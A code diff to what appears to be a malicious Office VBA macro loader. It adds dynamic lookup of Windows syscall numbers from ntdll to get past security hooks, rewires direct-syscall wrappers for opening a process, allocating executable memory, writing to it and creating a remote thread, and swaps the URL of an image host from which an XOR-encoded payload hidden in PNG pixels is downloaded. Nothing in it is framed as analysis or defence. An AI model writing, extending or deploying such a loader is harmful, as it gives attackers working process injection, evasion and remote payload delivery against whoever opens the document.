@@ -10,6 +10,11 @@ Private Const MEM_RESERVE As Long = &H2000
 Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
 Private Declare PtrSafe Function DispCallFunc Lib "oleaut32" (ByVal pvInstance As LongPtr, ByVal oVft As LongPtr, ByVal cc As Long, ByVal vtReturn As Integer, ByVal cActuals As Long, ByRef prgvt As Integer, ByRef prgpvarg As LongPtr, ByRef pvargResult As Variant) As Long
 
+' Dynamic SSN
+Private Declare PtrSafe Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As LongPtr
+Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
+    
 ' DELETE: debug for thread ID
 Private Declare PtrSafe Function GetThreadId Lib "kernel32" (ByVal Thread As LongPtr) As Long
 
@@ -62,6 +67,26 @@ Private Type SYSTEM_PROCESS_INFORMATION
     ' ... followed by other fields we can skip via offset
 End Type
 
+' Get SSN
+Function GetSyscallNumber(ByVal FunctionName As String) As Long
+    Dim pFunc As LongPtr
+    Dim ssn As Integer ' SSNs are 2 bytes (stored in EAX)
+    
+    ' Get the handle to ntdll and find the function address
+    pFunc = GetProcAddress(GetModuleHandle("ntdll.dll"), FunctionName)
+    
+    If pFunc = 0 Then
+        GetSyscallNumber = -1
+        Exit Function
+    End If
+    
+    ' In x64 Windows, the SSN is located 4 bytes into the function stub
+    ' Opcode pattern: 4C 8B D1 B8 [SSN SSN 00 00]
+    CopyMemory ssn, ByVal (pFunc + 4), 2
+    
+    GetSyscallNumber = CLng(ssn)
+End Function
+
 ' --- Core Syscall Execution ---
 ' This stub moves the first 4 args into registers, then triggers the syscall
 ' Assembly: mov r10, rcx; mov eax, [SSN]; syscall; ret
@@ -112,7 +137,7 @@ Public Function Syscall_NtAllocateVirtualMemory(ByVal hProcess As LongPtr, ByRef
     args(5) = PAGE_EXECUTE_READWRITE
     
     ' SSN 0x18
-    Syscall_NtAllocateVirtualMemory = ExecuteSyscall(&H18, args)
+    Syscall_NtAllocateVirtualMemory = ExecuteSyscall(GetSyscallNumber("NtAllocateVirtualMemory"), args)
 End Function
 
 Public Sub Syscall_NtClose(ByVal hObject As LongPtr)
@@ -128,7 +153,7 @@ Public Sub Syscall_NtClose(ByVal hObject As LongPtr)
     args(0) = hObject
     
     ' Execute NtClose (SSN 0x0F)
-    status = ExecuteSyscall(&HF, args)
+    status = ExecuteSyscall(GetSyscallNumber("NtClose"), args)
     
     If status = 0 Then
         Debug.Print "[+] NtClose: Successfully closed handle 0x" & Hex(hObject)
@@ -153,7 +178,7 @@ Public Function Syscall_NtOpenProcess(ByVal PID As Long) As LongPtr
     args(3) = VarPtr(cid)
     
     ' SSN 0x26
-    If ExecuteSyscall(&H26, args) = 0 Then Syscall_NtOpenProcess = hProc
+    If ExecuteSyscall(GetSyscallNumber("NtOpenProcess"), args) = 0 Then Syscall_NtOpenProcess = hProc
 End Function
 
 Public Function Syscall_NtWriteVirtualMemory(ByVal hProcess As LongPtr, ByVal baseAddr As LongPtr, ByVal bufferAddr As LongPtr, ByVal Size As LongPtr) As Long
@@ -167,7 +192,7 @@ Public Function Syscall_NtWriteVirtualMemory(ByVal hProcess As LongPtr, ByVal ba
     args(4) = VarPtr(bytesWritten)
     
     ' SSN 0x3A
-    Syscall_NtWriteVirtualMemory = ExecuteSyscall(&H3A, args)
+    Syscall_NtWriteVirtualMemory = ExecuteSyscall(GetSyscallNumber("NtWriteVirtualMemory"), args)
 End Function
 
 ' Update the wrapper to try the new Win11 SSNs
@@ -192,18 +217,7 @@ Public Function Syscall_NtCreateThreadEx(ByVal hProcess As LongPtr, ByVal startA
     args(10) = CLngPtr(0)              ' AttributeList
 
     ' Try SSN 0xC9 (Modern Win11 23H2/24H2)
-    status = ExecuteSyscall(&HC9, args)
-
-    ' If that fails, try 0xC8 or the older 0xC1
-    If status <> 0 Then
-        Debug.Print "SSN 0xC9 failed (0x" & Hex(status) & "). Trying 0xC8..."
-        status = ExecuteSyscall(&HC8, args)
-    End If
-    
-    If status <> 0 Then
-        Debug.Print "SSN 0xC8 failed (0x" & Hex(status) & "). Trying 0xC1..."
-        status = ExecuteSyscall(&HC1, args)
-    End If
+    status = ExecuteSyscall(GetSyscallNumber("NtCreateThreadEx"), args)
 
     If status = 0 Then
         Syscall_NtCreateThreadEx = hThread
@@ -280,7 +294,7 @@ Function DownloadAndExtract() As Byte()
     
     ' --- CONFIGURATION ---
     ' Make sure these match your Python script settings
-    imgURL = "https://i.postimg.cc/PXXkRDFY/o.png?dl=1" ' Direct link to your PNG
+    imgURL = "https://i.postimg.cc/MWJhK9jn/o.png?dl=1" ' Direct link to your PNG
     tempPath = Environ("TEMP") & "\downloaded_payload.png"
     xorKey = &H77
     offsetPixels = 20
